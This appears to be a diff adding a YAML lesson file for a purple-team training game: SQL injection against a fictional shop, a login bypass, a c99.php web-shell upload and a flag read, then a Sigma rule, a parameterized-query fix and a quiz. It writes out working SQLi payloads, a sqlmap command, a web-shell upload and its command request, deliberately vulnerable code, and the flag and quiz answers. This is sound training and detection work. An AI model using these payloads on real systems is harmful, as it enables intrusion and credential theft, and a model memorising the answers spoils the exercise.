@@ -1,0 +1,410 @@
+id: web-breach
+order: 2
+title: "The Hacked Shop"
+subtitle: "sqli to web shell to pivot"
+description: "Exploit VoltGear's unparameterized e-commerce search, capture the admin flag, then author a zero-false-positive detection rule, patch the SQL query, and verify it is blocked."
+track: purple
+difficulty: BEGINNER
+mitre_ids:
+  - T1595
+  - T1190
+  - T1505
+xp_reward: 500
+playable: true
+has_shop_widget: true
+target_host: web01
+target_ip: 10.0.1.10
+story: "VoltGear, a small online electronics shop hosted on DMZ node web01 (10.0.1.10), was compromised overnight. Customer order history vanished and a strange PHP file appeared in /var/www/uploads/. Reproduce the intrusion in our isolated lab, inspect the Apache & ModSecurity logs your attack leaves behind, write the Sigma rule to catch it, parameterize the vulnerable query, and prove the patch blocks re-exploitation."
+scope: "10.0.0.0/16 Virtual Corporate Range (Isolated). Only attack VoltGear on 10.0.1.10 (web01). Lab is isolated. Attacks stay inside the range."
+briefing_lines:
+  - "INCIDENT TICKET #VG-2026-01 // TARGET: VoltGear Storefront (10.0.1.10 // web01)"
+  - "A small online shop was just hacked. Find out how, recover the leaked flag, then switch sides to detect and patch the flaw."
+  - "REMINDER: Lab is isolated. Attacks stay inside the range."
+steps:
+  - id: recon-web01
+    order: 1
+    title: "Service Reconnaissance"
+    goal: "Scan VoltGear DMZ host web01 (10.0.1.10) to enumerate open ports and exposed web services."
+    tool: "nmap"
+    mitre_id: "T1595"
+    accepted_patterns:
+      - "^\\s*nmap\\b.*\\b(10\\.0\\.1\\.10|web01)\\b"
+      - "^\\s*curl\\b.*(-I|--head).*\\b(10\\.0\\.1\\.10|web01)\\b"
+    sample_command: "nmap -sV 10.0.1.10"
+    wrong_command_hint: "Target VoltGear at 10.0.1.10 (or web01) with nmap to discover exposed web services first."
+    expected_output:
+      - "Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-11 22:00 UTC"
+      - "Nmap scan report for web01.corp.internal (10.0.1.10)"
+      - "Host is up (0.42 ms latency)."
+      - "PORT     STATE SERVICE VERSION"
+      - "22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu"
+      - "80/tcp   open  http    nginx 1.18.0 (VoltGear Storefront)"
+      - "8080/tcp open  http    VoltGear Python API (/api/v1/search?q=)"
+      - "[+] Discovered endpoints: /api/v1/search?q=, /admin/login, /admin/upload"
+    hints:
+      - "Start with active port and version scanning against VoltGear's DMZ IP address."
+      - "Run nmap with service detection (-sV) targeting 10.0.1.10 or hostname web01."
+      - "Run exact command: nmap -sV 10.0.1.10"
+    sim_event:
+      technique_id: "T1595"
+      technique_name: "Active Scanning"
+      event: "nmap service discovery scan against VoltGear web01 (10.0.1.10)"
+      source_ip: "185.220.101.4"
+      target_host: "web01"
+      state: "DETECTED"
+      severity: "LOW"
+      module: "Watch"
+      breach: false
+    generated_logs:
+      - source: "apache"
+        event_type: "recon"
+        technique_id: "T1595"
+        source_ip: "185.220.101.4"
+        target_host: "web01"
+        raw_line: "185.220.101.4 - - [11/Nov/2026:22:01:03 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"Mozilla/5.0 Nmap Scripting Engine\""
+        is_true_positive: false
+        structured:
+          uri: "/"
+          method: "HEAD"
+          status_code: 200
+          source_ip: "185.220.101.4"
+          message: "Nmap Scripting Engine HTTP probe"
+
+  - id: sqli-probe
+    order: 2
+    title: "Exploit Search SQL Injection"
+    goal: "Probe /api/v1/search?q= using sqlmap OR type an SQL injection payload (such as ' UNION SELECT ...) into the VoltGear Shop search bar."
+    tool: "sqlmap / VoltGear Search"
+    mitre_id: "T1190"
+    accepted_patterns:
+      - "^\\s*sqlmap\\b.*(10\\.0\\.1\\.10|web01|search|voltgear)"
+      - "^\\s*curl\\b.*(10\\.0\\.1\\.10|web01).*('|%27|union|select)"
+      - "^\\s*shop:search\\b.*('|union|select|--|or\\s+1=1)"
+    sample_command: "sqlmap -u \"http://10.0.1.10/api/v1/search?q=test\" --batch"
+    wrong_command_hint: "Target the search endpoint /api/v1/search?q= on 10.0.1.10 with sqlmap, or enter a SQL injection payload like ' UNION SELECT 1,2,3-- in the VoltGear Shop Search input."
+    expected_output:
+      - "[*] testing connection to http://10.0.1.10/api/v1/search?q=test"
+      - "[+] Parameter 'q' (GET) appears injectable (MySQL error-based & UNION query)"
+      - "[*] payload executed: SELECT id, name, price FROM products WHERE name LIKE '%test' UNION SELECT 1, username, password_hash FROM admin_users--%'"
+      - "[+] Extracted admin row -> user: shop_admin | hash: $2b$12$k9X... | hint: upload portal unlocked at /admin/upload"
+      - "[+] Vulnerability confirmed on web01."
+    hints:
+      - "Test whether the product search parameter 'q' concatenates user input directly into SQL."
+      - "Either run sqlmap against http://10.0.1.10/api/v1/search?q=test OR type `' UNION SELECT 1,username,password_hash FROM admin_users--` in VoltGear Search."
+      - "Run exact command: sqlmap -u \"http://10.0.1.10/api/v1/search?q=test\" --batch"
+    sim_event:
+      technique_id: "T1190"
+      technique_name: "Exploit Public-Facing Application"
+      event: "SQL injection UNION SELECT probe on web01 /api/v1/search"
+      source_ip: "185.220.101.4"
+      target_host: "web01"
+      state: "ALERT"
+      severity: "HIGH"
+      module: "Watch"
+      breach: true
+    shop_response:
+      mode: "search"
+      leaked_rows:
+        - id: "1"
+          name: "shop_admin"
+          detail: "admin@voltgear.local | token:VG-ADMIN-BYPASS"
+        - id: "2"
+          name: "/admin/login"
+          detail: "Accepts unparameterized username clause (' OR '1'='1)"
+    generated_logs:
+      - source: "modsecurity"
+        event_type: "attack"
+        technique_id: "T1190"
+        source_ip: "185.220.101.4"
+        target_host: "web01"
+        raw_line: "185.220.101.4 - - [11/Nov/2026:22:01:28 +0000] \"GET /api/v1/search?q=' UNION SELECT 1,username,password_hash FROM admin_users-- HTTP/1.1\" 200 1842 \"-\" \"sqlmap/1.7\""
+        is_true_positive: true
+        structured:
+          uri: "/api/v1/search?q=' UNION SELECT 1,username,password_hash FROM admin_users--"
+          method: "GET"
+          status_code: 200
+          source_ip: "185.220.101.4"
+          message: "ModSecurity Warning: SQL Injection Attack Detected via libinjection (UNION SELECT)"
+
+  - id: webshell-upload
+    order: 3
+    title: "Bypass Admin Auth & Drop Web Shell"
+    goal: "Bypass VoltGear's login using SQLi (in the Shop Login form) or upload c99.php to /admin/upload."
+    tool: "curl / VoltGear Login"
+    mitre_id: "T1505"
+    accepted_patterns:
+      - "^\\s*shop:login\\b.*('|or\\s+'?1'?='?1|--)"
+      - "^\\s*curl\\b.*(10\\.0\\.1\\.10|web01).*(upload|c99\\.php|login)"
+      - "^\\s*sqlmap\\b.*--os-shell"
+    sample_command: "curl -X POST http://10.0.1.10/admin/upload -F \"file=@c99.php\""
+    wrong_command_hint: "Bypass login with `' OR '1'='1` in the VoltGear Login box OR upload `c99.php` to `http://10.0.1.10/admin/upload` via curl."
+    expected_output:
+      - "[+] Admin query bypassed: SELECT * FROM admin_users WHERE user='' OR '1'='1'--"
+      - "[*] Authenticated session cookie issued for shop_admin."
+      - "[+] Upload succeeded -> /var/www/uploads/c99.php (HTTP 201 Created)"
+      - "[!] Web shell reachable at http://10.0.1.10/uploads/c99.php"
+    hints:
+      - "Use classic authentication bypass SQL injection on the VoltGear admin login or send a multipart upload to /admin/upload."
+      - "Enter `admin' OR '1'='1` in VoltGear Login OR curl POST `-F \"file=@c99.php\"` to `http://10.0.1.10/admin/upload`."
+      - "Run exact command: curl -X POST http://10.0.1.10/admin/upload -F \"file=@c99.php\""
+    sim_event:
+      technique_id: "T1505"
+      technique_name: "Server Software Component"
+      event: "Auth bypass & PHP web shell c99.php uploaded to web01"
+      source_ip: "185.220.101.4"
+      target_host: "web01"
+      state: "ALERT"
+      severity: "CRITICAL"
+      module: "Watch"
+      breach: true
+    shop_response:
+      mode: "login"
+      authenticated: true
+      user: "shop_admin"
+      note: "Session elevated! Web shell deployed at /uploads/c99.php"
+    generated_logs:
+      - source: "apache"
+        event_type: "attack"
+        technique_id: "T1190"
+        source_ip: "185.220.101.4"
+        target_host: "web01"
+        raw_line: "185.220.101.4 - - [11/Nov/2026:22:01:49 +0000] \"POST /admin/login?user=admin' OR '1'='1 HTTP/1.1\" 302 214 \"-\" \"Mozilla/5.0\""
+        is_true_positive: true
+        structured:
+          uri: "/admin/login?user=admin' OR '1'='1"
+          method: "POST"
+          status_code: 302
+          source_ip: "185.220.101.4"
+          message: "Admin login SQL injection authentication bypass"
+
+  - id: read-flag
+    order: 4
+    title: "Capture Exfiltration Flag"
+    goal: "Execute a command through the deployed c99.php web shell (or click Read Flag) to retrieve /var/www/flag.txt."
+    tool: "curl / Web Shell"
+    mitre_id: "T1505"
+    accepted_patterns:
+      - "^\\s*curl\\b.*(10\\.0\\.1\\.10|web01).*uploads/c99\\.php"
+      - "^\\s*(cat\\s+/var/www/flag\\.txt|shop:read_flag)\\s*$"
+    sample_command: "curl \"http://10.0.1.10/uploads/c99.php?cmd=cat+/var/www/flag.txt\""
+    wrong_command_hint: "Query the uploaded web shell at http://10.0.1.10/uploads/c99.php?cmd=cat+/var/www/flag.txt to read the flag."
+    expected_output:
+      - "[*] Executing via web01 /uploads/c99.php (uid=33 www-data)..."
+      - "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
+      - "FLAG RECOVERED: NOENTRY{sqli_t0_sh3ll_v0ltg3ar_w4f}"
+      - "[*] Proceed to Stage 3 (FLAG CAPTURE) and submit the flag."
+    hints:
+      - "Invoke the c99.php web shell over HTTP passing `cmd=cat+/var/www/flag.txt`."
+      - "Send GET request to http://10.0.1.10/uploads/c99.php?cmd=cat+/var/www/flag.txt"
+      - "Run exact command: curl \"http://10.0.1.10/uploads/c99.php?cmd=cat+/var/www/flag.txt\""
+    sim_event:
+      technique_id: "T1505"
+      technique_name: "Server Software Component"
+      event: "Web shell c99.php executed cat /var/www/flag.txt on web01"
+      source_ip: "185.220.101.4"
+      target_host: "web01"
+      state: "ALERT"
+      severity: "CRITICAL"
+      module: "Watch"
+      breach: true
+    shop_response:
+      mode: "flag"
+      flag: "NOENTRY{sqli_t0_sh3ll_v0ltg3ar_w4f}"
+    generated_logs:
+      - source: "wazuh"
+        event_type: "attack"
+        technique_id: "T1505"
+        source_ip: "185.220.101.4"
+        target_host: "web01"
+        raw_line: "185.220.101.4 - - [11/Nov/2026:22:02:11 +0000] \"GET /uploads/c99.php?cmd=cat+/var/www/flag.txt HTTP/1.1\" 200 128 \"-\" \"curl/8.2.1\""
+        is_true_positive: true
+        structured:
+          uri: "/uploads/c99.php?cmd=cat+/var/www/flag.txt"
+          method: "GET"
+          status_code: 200
+          source_ip: "185.220.101.4"
+          message: "Wazuh Agent: www-data spawned shell execution via /uploads/c99.php"
+
+flag: "NOENTRY{sqli_t0_sh3ll_v0ltg3ar_w4f}"
+
+rule_challenge:
+  prompt: "Select the primary MITRE ATT&CK technique and complete the Sigma rule below to match SQLi probes and web shell requests with ZERO false positives on normal VoltGear customer traffic."
+  expected_mitre_id: "T1190"
+  mitre_choices:
+    - id: "T1190"
+      label: "T1190 - Exploit Public-Facing Application"
+    - id: "T1110"
+      label: "T1110 - Brute Force"
+    - id: "T1486"
+      label: "T1486 - Data Encrypted for Impact"
+    - id: "T1048"
+      label: "T1048 - Exfiltration Over Alternative Protocol"
+  required_min_hits: 2
+  max_false_positives: 0
+  template_yaml: |
+    title: VoltGear SQLi and Webshell Detection
+    id: rule-mission-web-breach
+    level: high
+    logsource:
+      category: webserver
+      service: apache
+    detection:
+      selection:
+        uri|contains:
+          - "REPLACE_WITH_SQLI_SUBSTRING"
+          - "REPLACE_WITH_SHELL_FILENAME"
+      condition: selection
+  reference_solution_yaml: |
+    title: VoltGear SQLi and Webshell Detection
+    id: rule-mission-web-breach
+    level: high
+    logsource:
+      category: webserver
+      service: apache
+    detection:
+      selection:
+        uri|contains:
+          - "union select"
+          - "' or '1'='1"
+          - "c99.php"
+      condition: selection
+  benign_baseline_logs:
+    - source: "apache"
+      event_type: "normal"
+      technique_id: "NONE"
+      source_ip: "10.0.2.20"
+      target_host: "web01"
+      raw_line: "10.0.2.20 - - [11/Nov/2026:22:00:44 +0000] \"GET /index.html HTTP/1.1\" 200 4120 \"-\" \"Mozilla/5.0\""
+      benign: true
+      is_true_positive: false
+      structured:
+        uri: "/index.html"
+        method: "GET"
+        status_code: 200
+        source_ip: "10.0.2.20"
+        benign: true
+    - source: "apache"
+      event_type: "normal"
+      technique_id: "NONE"
+      source_ip: "10.0.2.21"
+      target_host: "web01"
+      raw_line: "10.0.2.21 - - [11/Nov/2026:22:01:02 +0000] \"GET /api/v1/search?q=mechanical+keyboard HTTP/1.1\" 200 940 \"-\" \"Mozilla/5.0\""
+      benign: true
+      is_true_positive: false
+      structured:
+        uri: "/api/v1/search?q=mechanical+keyboard"
+        method: "GET"
+        status_code: 200
+        source_ip: "10.0.2.21"
+        benign: true
+    - source: "apache"
+      event_type: "normal"
+      technique_id: "NONE"
+      source_ip: "10.0.2.22"
+      target_host: "web01"
+      raw_line: "10.0.2.22 - - [11/Nov/2026:22:01:15 +0000] \"GET /static/app.js HTTP/1.1\" 200 8420 \"-\" \"Mozilla/5.0\""
+      benign: true
+      is_true_positive: false
+      structured:
+        uri: "/static/app.js"
+        method: "GET"
+        status_code: 200
+        source_ip: "10.0.2.22"
+        benign: true
+
+fix:
+  prompt: "VoltGear's search handler builds SQL using string concatenation. Choose the durable remediation OR edit the code snippet to use parameterized placeholders and strict upload allowlisting."
+  language: "python"
+  vulnerable_code: |
+    def search_products(cursor, q: str):
+        # VULNERABLE: direct string interpolation into SQL statement
+        sql = f"SELECT id, name, price FROM products WHERE name LIKE '%{q}%'"
+        cursor.execute(sql)
+        return cursor.fetchall()
+  options:
+    - id: "opt-client-only"
+      label: "Strip single quotes only in browser JavaScript before fetch()"
+      code_snippet: "q = input.value.replace(\"'\", \"\");"
+      is_correct: false
+      explanation: "Attackers bypass browser JavaScript completely using curl or sqlmap; validation in JS never protects the backend SQL parser."
+    - id: "opt-blacklist"
+      label: "Remove uppercase 'SELECT' keyword with str.replace()"
+      code_snippet: "q = q.replace('SELECT', ''); cursor.execute(f\"... '%{q}%'\")"
+      is_correct: false
+      explanation: "Case-sensitive blacklists are trivially defeated with lowercase `union select` or nested tokens like `SELSELECTECT`."
+    - id: "opt-parameterized"
+      label: "Use parameterized prepared SQL placeholders + .php/.phtml upload denial"
+      code_snippet: "cursor.execute('SELECT id, name, price FROM products WHERE name LIKE %s', (f'%{q}%',))"
+      is_correct: true
+      explanation: "Parameterized queries separate SQL syntax from user data at the driver level, neutralizing all SQL injection payloads."
+  accepted_patch_patterns:
+    - "cursor\\.execute\\([^)]*(%s|\\?|:\\w+)[^)]*,"
+  patch_explanation: "Parameterized placeholder syntax cleanly binds `q` as data rather than executable SQL syntax."
+
+verify:
+  attack_command: "sqlmap -u \"http://10.0.1.10/api/v1/search?q=' UNION SELECT 1,username,password_hash--\" --batch && curl -F file=@c99.php http://10.0.1.10/admin/upload"
+  blocked_output:
+    - "[*] Re-running SQLi + web shell vector against hardened web01 (10.0.1.10)..."
+    - "[403 FORBIDDEN] ModSecurity Rule 949110 matched Inbound Anomaly Score Exceeded (SQLi payload blocked)."
+    - "[BACKEND QUERY] Prepared statement bound input strictly as literal string '%'' UNION SELECT...'; 0 unauthorized rows returned."
+    - "[UPLOAD FILTER] Blocked extension .php -> File upload policy allows [.png, .jpg, .webp] only."
+  blocked_log_line: "185.220.101.4 - - [11/Nov/2026:22:04:10 +0000] \"GET /api/v1/search?q=' UNION SELECT...\" 403 0 [BLOCKED ModSecurity 949110 + Prepared Statement]"
+  waf_control: "ModSecurity CRS Rule 949110 + SQL Parameterized Prepared Statements + Strict Upload Allowlist"
+  explanation: "With parameterized SQL statements in the application layer and ModSecurity blocking anomalous payloads at the reverse proxy, both the search SQLi and PHP shell upload fail immediately."
+
+debrief:
+  why_it_worked: "VoltGear concatenated the HTTP query parameter `q` and login field straight into raw SQL strings while leaving `/admin/upload` open to arbitrary `.php` scripts executable by Nginx/PHP-FPM."
+  how_it_was_stopped: "You correlated the Apache/ModSecurity HTTP logs with MITRE T1190, deployed a zero-false-positive Sigma detection rule, refactored the database layer to parameterized queries, and proved ModSecurity + upload extension allowlisting block replay attacks."
+  mitre_summary: "T1595 (Active Scanning) -> T1190 (Exploit Public-Facing Application) -> T1505 (Web Shell Component)."
+  key_takeaways:
+    - "Never format untrusted input into SQL queries; always use parameterized prepared statements."
+    - "Treat client-side sanitization and naive keyword blacklists as non-security controls."
+    - "Defense in depth: store uploads outside the webroot and disallow script execution in upload paths."
+
+quiz:
+  - id: "q1"
+    question: "Why did VoltGear's search endpoint fall victim to UNION SELECT extraction?"
+    options:
+      - "Nginx was serving static files over HTTP port 80"
+      - "User input `q` was interpolated directly into the SQL query string without parameterization"
+      - "The database password used bcrypt hashing"
+      - "The browser did not send a CSRF header"
+    correct_index: 1
+    explanation: "Concatenating `q` directly into SQL lets the database parser interpret SQL quotes and UNION keywords as instructions instead of data."
+  - id: "q2"
+    question: "Which MITRE ATT&CK technique corresponds to exploiting an internet-facing web SQLi vulnerability?"
+    options:
+      - "T1486 - Data Encrypted for Impact"
+      - "T1190 - Exploit Public-Facing Application"
+      - "T1003 - OS Credential Dumping"
+      - "T1071 - Application Layer Protocol"
+    correct_index: 1
+    explanation: "T1190 captures exploitation of software flaws in public-facing web applications and APIs."
+  - id: "q3"
+    question: "Why is blocking only `'SELECT'` via string replacement an inadequate SQLi fix?"
+    options:
+      - "It slows down CSS rendering"
+      - "Attackers easily bypass naive blacklists via lowercase keywords, URL encoding, or nested tokens"
+      - "SQL does not use the SELECT keyword"
+      - "Prepared statements require blacklists to function"
+    correct_index: 1
+    explanation: "Adversaries bypass case-sensitive or single-pass string stripping cleanly; parameterized queries fix the root parsing boundary."
+  - id: "q4"
+    question: "When writing a Sigma rule for `/api/v1/search`, why did we check benign requests like `?q=mechanical+keyboard`?"
+    options:
+      - "To increase total alert volume"
+      - "To verify zero false positives so normal customer browsing does not flood SOC analysts or trigger bad auto-bans"
+      - "Because ModSecurity ignores POST traffic"
+      - "To allow php uploads on staging servers"
+    correct_index: 1
+    explanation: "Testing against normal baseline traffic ensures high-signal detections without disrupting legitimate users."
+  - id: "q5"
+    question: "What secondary hardening control prevents an uploaded `c99.php` from running even if an attacker reaches the upload folder?"
+    options:
+      - "Allowing all extensions in `/var/www/uploads`"
+      - "Renaming the admin URL only"
+      - "Allowlisting safe image MIME/extensions and disabling script execution in upload directories"
+      - "Turning off Apache access logging"
+    correct_index: 2
+    explanation: "Strict allowlists combined with non-executable storage permissions prevent web shell code execution."
+
